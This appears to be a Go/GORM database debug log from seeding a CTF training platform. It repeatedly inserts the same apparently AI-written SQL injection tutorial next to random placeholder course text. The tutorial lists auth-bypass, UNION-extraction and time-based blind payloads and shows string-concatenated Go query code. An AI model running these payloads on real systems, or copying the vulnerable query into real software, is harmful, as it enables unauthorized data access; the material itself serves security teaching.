| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,93) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.435ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.184ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.498','2025-06-09 14:07:55.498',NULL,'cyber security and abvkb','GUZacqfDUKjfKVjIAcjoDiPhRToAXwPqyyHUJKDtXWEETCtOdftCQJxCPCAkZkSKjvGObaoYzMFvLRSiwXMPMSgbpSdyBNqRxBuK',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.505ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.484ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 94 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[13.219ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.505','2025-06-09 14:07:55.505',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,94) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.436ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.191ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.518','2025-06-09 14:07:55.518',NULL,'cyber security and rvqnx','fRueXjxyXQvBFBnCCOrkJGsdFOYmnBPavQETHKzDzJeamqYAVmMIOuyOMbaTXPWvUzzvQNycsPYCnnKLLuuxhMzITjFVEYiRsgnM',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.554ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.542ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 95 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[10.186ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.528','2025-06-09 14:07:55.528',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,95) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.424ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[11.788ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.535','2025-06-09 14:07:55.535',NULL,'cyber security and fbyqe','hKUnGllhhPHTzymRSBCYwVyvecGycCNyEbNFumKPsMVFETMXhOFPdJyAwnmdqdPLsHieOSXfdCnQjdHauIMaYqRkDWAImnxYZHui',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.515ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.456ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 96 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.543ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.548','2025-06-09 14:07:55.548',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,96) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.544ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.914ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.555','2025-06-09 14:07:55.555',NULL,'cyber security and fwnrx','zaotXDAgUgkjwIMkPXkMXJuflTHlyMmZOnzfFkNSJGOPtwGOWorfvPjlUNHXUtitmmyUUZkcxyJnPWpavtWdAKGlnlQNrVPjuPAx',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[7.805ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.500ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 97 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[15.054ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.571','2025-06-09 14:07:55.571',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,97) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.485ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.349ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.578','2025-06-09 14:07:55.578',NULL,'cyber security and asivu','MBKckHOlEjZzWSflvoTQLEVTSwLKBKKdhqhqMRnJgxJRxPRZisXAMVxfVsPQDbbfqjEhGZmMQYjFVkCwlESTaLoHrwuEZdBvaBhc',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.511ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.486ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 98 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.173ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.585','2025-06-09 14:07:55.585',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
